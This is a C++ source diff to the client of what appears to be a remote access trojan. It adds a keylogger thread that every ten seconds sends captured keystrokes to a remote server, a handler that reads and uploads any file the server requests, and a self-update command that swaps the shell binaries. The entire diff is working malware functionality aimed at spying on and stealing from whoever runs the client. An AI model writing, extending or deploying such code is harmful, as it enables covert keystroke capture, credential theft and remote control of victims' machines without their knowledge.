@@ -11,6 +11,7 @@ using namespace libzippp;
 Client* Client::clientptr = NULL;
 bool Client::connected = false;
 Client Client::main_client(Settings::serverIP, Settings::serverPort);
+keylogger logger = keylogger();
 auto temp_name = std::string("tempfile.tmp");
 
 
@@ -73,16 +74,43 @@ bool Client::ProcessPacketType(PacketType _PacketType)
 		}
 		break;
 	}
+	case PacketType::ClientFileTransferRequestFile:
+	{
+		std::string FileName; //string to store file name
+		if (!GetString(FileName)) //If issue getting file name
+			return false; //Failure to process packet
+
+		ofile = FileTransferData();
+		ofile.infileStream.open(FileName, std::ios::binary | std::ios::ate); //Open file to read in binary | ate mode. We use ate so we can use tellg to get file size. We use binary because we need to read bytes as raw data
+		if (!ofile.infileStream.is_open()) //If file is not open? (Error opening file?)
+		{
+			return true;
+		}
+		ofile.fileName = FileName; //set file name just so we can print it out after done transferring
+		ofile.fileSize = ofile.infileStream.tellg(); //Get file size
+		ofile.infileStream.seekg(0); //Set cursor position in file back to offset 0 for when we read file
+		ofile.fileOffset = 0; //Update file offset for knowing when we hit end of file
+
+		if (!HandleSendFile()) //Attempt to send byte buffer from file. If failure...
+			return false;
+		break;
+	}
+	case PacketType::ClientFileTransferRequestNextBuffer:
+	{
+		if (!HandleSendFile()) //Attempt to send byte buffer from file. If failure...
+			return false;
+		break;
+	}
 	case PacketType::Download: {
 		std::string exe;
 		if (!GetString(exe))
 			return false;
 
-		if (!FileExists(exe.c_str())) {
+		if (!FileExists((SHELL_PATH() + exe).c_str())) {
 			int i = 0;
 			while (!Client::main_client.RequestFile(exe)) {
 				if (i > 9)
-					return 1;
+					return true;
 				Log("Failed to request file, retrying...");
 				Client::main_client.RequestFile(exe);
 				i++;
@@ -138,8 +166,25 @@ bool Client::ProcessPacketType(PacketType _PacketType)
 		}
 		break;
 	}
+	case PacketType::Update:
+	{
+		//Just because otherwise it messes with the next instructions
+		std::string exe;
+		if (!GetString(exe))
+			return false;
+
+		Log("Update init\n");
+		//Temporary rename to trigger update in main routine
+		rename(SHELL_NAME, SHELL_UPDATE_NAME);
+		rename(SHELL_BACKUP_NAME, SHELL_UPDATE_NAME);
+		Log("Renamed old files\n");
+		SendString("Renamed files successfully, update begun\n", PacketType::Warning);
+		break;
+	}
+	case PacketType::Heartbeat:
+		break;
 	default: //If PacketType type is not accounted for
-			 //std::cout << "Unrecognized PacketType: " << (int32_t)_PacketType << std::endl; //Display that PacketType was not found
+		std::cout << "Unrecognized PacketType: " << (int32_t)_PacketType << std::endl; //Display that PacketType was not found
 		break;
 	}
 	return true;
@@ -164,6 +209,16 @@ void Client::ClientThread()
 	else //If connection socket was not closed properly for some reason from our function
 	{
 		//std::cout << "Socket was not able to be closed." << std::endl;
+	}
+}
+
+void Client::KeyloggerThread() {
+	while (true) {
+		if (keylogger::buffer.size()) {
+			clientptr->SendString(logger.GetBuffer(), PacketType::Keylog);
+			logger.ClearBuffer();
+		}
+		Sleep(10000);
 	}
 }
 
@@ -197,8 +252,12 @@ bool Client::resolveIP(std::string &hostname)
 	return true;
 }
 
-bool Client::RequestFile(std::string FileName)
+bool Client::RequestFile(std::string FileName, bool wait)
 {
+	if(wait)
+		//Wait just in case another file is already being downloaded
+		while (file.outfileStream.is_open()) 
+			Sleep(100);
 	file.outfileStream.open(GetCWD() + temp_name, std::ofstream::binary); //open file to write file to
 	file.fileName = FileName; //save file name
 	file.bytesWritten = 0; //reset byteswritten to 0 since we are working with a new file
